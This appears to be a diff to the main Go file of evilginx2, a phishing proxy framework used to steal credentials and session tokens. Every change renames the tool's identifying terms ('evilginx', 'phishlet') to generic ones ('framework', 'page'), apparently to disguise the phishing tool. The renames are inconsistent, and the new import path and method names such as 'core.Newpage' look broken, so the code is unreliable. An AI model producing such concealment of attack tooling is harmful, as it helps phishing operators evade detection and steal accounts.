@@ -8,12 +8,12 @@ import (
 	"path/filepath"
 	"regexp"
 
-	"github.com/kgretzky/evilginx2/core"
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/framework2/core"
+	"github.com/kgretzky/framework2/database"
+	"github.com/kgretzky/framework2/log"
 )
 
-var phishlets_dir = flag.String("p", "", "Phishlets directory path")
+var pages_dir = flag.String("p", "", "pages directory path")
 var templates_dir = flag.String("t", "", "HTML templates directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
@@ -35,12 +35,12 @@ func main() {
 
 	core.Banner()
 	flag.Parse()
-	if *phishlets_dir == "" {
-		*phishlets_dir = joinPath(exe_dir, "./phishlets")
-		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-			*phishlets_dir = "/usr/share/evilginx/phishlets/"
-			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
+	if *pages_dir == "" {
+		*pages_dir = joinPath(exe_dir, "./pages")
+		if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
+			*pages_dir = "/usr/share/framework/pages/"
+			if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
+				log.Fatal("you need to provide the path to directory where your pages are stored: ./framework -p <pages_path>")
 				return
 			}
 		}
@@ -48,14 +48,14 @@ func main() {
 	if *templates_dir == "" {
 		*templates_dir = joinPath(exe_dir, "./templates")
 		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
-			*templates_dir = "/usr/share/evilginx/templates/"
+			*templates_dir = "/usr/share/framework/templates/"
 			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
 				*templates_dir = joinPath(exe_dir, "./templates")
 			}
 		}
 	}
-	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
+	if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
+		log.Fatal("provided pages directory path does not exist: %s", *pages_dir)
 		return
 	}
 	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
@@ -67,8 +67,8 @@ func main() {
 		log.Info("debug output enabled")
 	}
 
-	phishlets_path := *phishlets_dir
-	log.Info("loading phishlets from: %s", phishlets_path)
+	pages_path := *pages_dir
+	log.Info("loading pages from: %s", pages_path)
 
 	if *cfg_dir == "" {
 		usr, err := user.Current()
@@ -76,7 +76,7 @@ func main() {
 			log.Fatal("%v", err)
 			return
 		}
-		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
+		*cfg_dir = filepath.Join(usr.HomeDir, ".framework")
 	}
 
 	config_path := *cfg_dir
@@ -114,9 +114,9 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := ioutil.ReadDir(pages_path)
 	if err != nil {
-		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
+		log.Fatal("failed to list pages directory '%s': %v", pages_path, err)
 		return
 	}
 	for _, f := range files {
@@ -128,13 +128,13 @@ func main() {
 			}
 			pname := rpname[1]
 			if pname != "" {
-				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
+				pl, err := core.Newpage(pname, filepath.Join(pages_path, f.Name()), cfg)
 				if err != nil {
-					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
+					log.Error("failed to load page '%s': %v", f.Name(), err)
 					continue
 				}
-				//log.Info("loaded phishlet '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
-				cfg.AddPhishlet(pname, pl)
+				//log.Info("loaded page '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
+				cfg.Addpage(pname, pl)
 			}
 		}
 	}
